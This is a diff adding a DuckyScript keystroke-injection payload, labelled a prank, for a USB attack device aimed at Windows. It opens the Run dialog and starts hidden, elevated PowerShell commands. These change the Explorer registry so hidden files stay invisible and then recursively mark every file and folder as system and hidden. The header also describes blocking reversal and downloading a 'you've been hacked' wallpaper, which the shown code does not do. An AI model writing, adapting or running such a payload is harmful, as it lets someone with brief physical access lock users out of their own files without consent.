@@ -1,0 +1,17 @@
+REM Title: A_Ducky_Nightmare
+REM Author: Pol8y
+REM Description: Disable Hidden and SuperHidden file view in explorer, assign hidden attribute to every file and folder in C:\users\$currentuser and prevent reverting, download and set "you've been hacked" image as background
+REM Target: Windows / Powershell
+REM Version: 1.0
+REM Category: Prank
+
+DELAY 1000
+GUI r
+DELAY 350
+STRING powershell -windowstyle hidden Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced -Name Hidden -Value "2"
+CTRL-SHIFT ENTER
+GUI r
+DELAY 350
+STRING powershell -windowstyle hidden attrib +s +h /s /d *
+CTRL-SHIFT ENTER
+DELAY 2000
